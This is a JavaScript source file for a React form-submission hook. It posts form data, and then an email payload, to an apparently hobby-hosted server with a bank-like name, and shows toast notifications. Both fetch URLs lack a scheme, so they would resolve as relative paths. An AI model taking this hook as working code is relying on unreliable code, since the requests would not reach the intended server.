import { useState } from "react";
import { toast, Bounce } from "react-toastify";

function useFormSubmit(data, param) {
  const [isLoading, setIsLoading] = useState(false);

  const notifyError = (message) =>
    toast.error(message, {
      position: "top-center",
      autoClose: false,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "colored",
      transition: Bounce,
    });

  const notifySuccess = (message) =>
    toast.success(message, {
      position: "top-center",
      autoClose: false,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "colored",
      transition: Bounce,
    });

  const dismissAll = () => toast.dismiss();

  const handleSubmit = async (e) => {
    e.preventDefault();
    dismissAll();
    setIsLoading(true);
    try {
      const response = await fetch(
        `capital-one-server-production.up.railway.app${param}`,
        {
          method: "POST",
          credentials: "include", // Include cookies in the request
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        }
      );
      const confirmation = await response.json();
      const status = await response.status;
      if (status === 200) {
        return sendMail([data.email, confirmation]);
      }
      if (typeof confirmation !== "string") {
        for (const error of confirmation) {
          notifyError(`${error.msg}`);
        }
        return;
      }
      notifyError(confirmation);
    } catch (e) {
      notifyError(e);
    } finally {
      setIsLoading(false);
    }
  };

  const sendMail = async (data) => {
    dismissAll();
    try {
      const response = await fetch(
        "capital-one-server-production.up.railway.app/api/email",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        }
      );
      const confirmation = await response.json();
      const status = await response.status;
      if (status === 200) {
        return notifySuccess(confirmation);
      }
      notifyError(confirmation);
    } catch (e) {
      notifyError(e);
    } finally {
      setIsLoading(false);
    }
  };

  return { isLoading, handleSubmit };
}

export default useFormSubmit;
